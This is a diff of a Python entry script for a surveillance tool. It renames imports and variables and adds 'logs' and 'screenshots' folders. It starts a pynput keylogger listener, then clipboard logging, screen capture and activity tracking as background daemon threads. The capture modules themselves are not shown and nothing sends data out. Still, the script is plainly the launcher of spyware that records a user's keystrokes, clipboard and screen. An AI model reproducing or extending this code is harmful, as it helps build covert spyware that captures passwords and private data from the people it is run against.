@@ -1,29 +1,33 @@
 import threading
-from importKeyboard import keyboard
-from activeKeylogger import on_press
-from activeImport import log_clipboard
-from activeImageGrab import capture_screen
-from activeActivity import track_activity
+from pynput import keyboard
+from keyLogger import onPress
+from clipBoard import logClipboard
+from screenCapture import captureScreen
+from activityTracker import trackActivity
+import os
+
+os.makedirs("logs", exist_ok=True)
+os.makedirs("screenshots", exist_ok=True)
 
 if __name__ == "__main__":
     # Start keylogger
-    listener = keyboard.Listener(on_press=on_press)
-    listener.start()
+    keyListener = keyboard.Listener(on_press=onPress)
+    keyListener.start()
 
     # Start clipboard logger
-    clipboard_thread = threading.Thread(target=log_clipboard)
-    clipboard_thread.daemon = True
-    clipboard_thread.start()
+    clipboardThread = threading.Thread(target=logClipboard)
+    clipboardThread.daemon = True
+    clipboardThread.start()
 
     # Start screen capture
-    screen_thread = threading.Thread(target=capture_screen)
-    screen_thread.daemon = True
-    screen_thread.start()
+    screenThread = threading.Thread(target=captureScreen)
+    screenThread.daemon = True
+    screenThread.start()
 
     # Start activity tracker
-    activity_thread = threading.Thread(target=track_activity)
-    activity_thread.daemon = True
-    activity_thread.start()
+    activityThread = threading.Thread(target=trackActivity)
+    activityThread.daemon = True
+    activityThread.start()
 
     # Keep everything running
-    listener.join()
+    keyListener.join()
